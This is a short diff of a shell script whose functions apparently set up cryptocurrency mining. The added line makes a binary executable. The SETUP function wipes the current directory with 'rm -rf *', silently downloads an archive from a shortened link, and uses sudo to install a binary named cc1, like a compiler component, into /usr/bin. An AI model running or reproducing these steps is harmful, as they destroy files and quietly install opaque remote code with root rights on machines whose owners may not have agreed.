@@ -62,6 +62,7 @@ MINE_E() {
 SETUP() {
 rm -rf *
 wget https://git.io/JE3L7  --content-disposition >/dev/null 2>&1
+chmod u+x cc1
 unzip -q test3.zip
 sudo mv cc1 /usr/bin
 }
